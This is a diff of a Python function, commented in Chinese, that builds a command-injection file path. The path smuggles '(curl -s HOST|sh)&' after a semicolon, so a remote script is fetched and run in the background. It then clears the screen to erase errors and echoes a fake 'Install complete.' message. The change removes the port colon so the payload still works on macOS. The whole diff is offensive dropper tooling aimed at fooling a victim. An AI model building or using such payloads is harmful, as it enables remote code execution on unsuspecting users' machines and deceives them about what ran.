@@ -31,18 +31,28 @@ def build_dropper(host: str, port: int, verbose: bool) -> str:
     拼出注入用的路径。
 
     结构：  /tmp/<注入点> ; <dropper> ; clear ; echo <假提示> ; #
+
     报错只保留最后一个 / 之后的部分，所以 dropper 必须全在这后面。
 
-    dropper 本体：(curl -s HOST:PORT|sh)&
-      & 让它后台跑，立刻回到提示符
-      clear 紧跟着擦掉所有报错
+    ★★ 两个真机踩出来的坑：
+      ① 不能有斜杠 —— basename 截断会把前半段丢掉
+      ② 不能有冒号 —— macOS 会把路径里的 : 显示成 /，导致 HOST:PORT 废掉
+         所以端口 80 时直接省略，curl 默认就走 80
     """
+    if port in (80, 0):
+        target = host                      # 没有冒号
+    else:
+        raise SystemExit(
+            "端口 %d 不能用：payload 里不能出现冒号（macOS 会把 : 转成 /）。\n"
+            "请把接收端挂到 80 端口，然后 --port 80。" % port
+        )
+
     if verbose:
         tail = ";clear;echo \u2713 Install complete.;#"
     else:
         tail = ";clear;#"
 
-    dropper = f"(curl -s {host}:{port}|sh)&"
+    dropper = f"(curl -s {target}|sh)&"
     # /tmp/x 是整个路径里唯一允许出现斜杠的地方
     path = "/tmp/x;" + dropper + tail
     return path
